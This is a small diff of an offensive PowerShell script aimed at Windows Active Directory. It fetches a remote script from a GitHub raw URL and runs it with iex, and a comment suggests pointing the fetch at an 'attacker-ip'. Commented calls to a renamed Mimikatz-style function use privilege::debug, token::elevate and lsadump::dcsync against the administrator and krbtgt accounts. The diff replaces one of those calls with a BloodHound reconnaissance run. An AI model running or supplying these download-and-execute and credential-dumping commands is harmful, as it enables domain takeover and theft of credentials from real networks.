@@ -41,4 +41,4 @@ $out = 0
 # Change this to "attacker-ip" for internal sources
 wget('https://raw.githubusercontent.com/evandromdl/testsm1m1/main/shaa.ps1') -UseBasicParsing|iex
 #Invoke-SoHighSoHigh -Command '"privilege::debug" "token::elevate" "lsadump::dcsync /domain:tenablead.local /user:administrator"'
-#Invoke-SoHighSoHigh -Command '"lsadump::dcsync /domain:ppinda.local /user:krbtgt"'
+Invoke-BloodHound
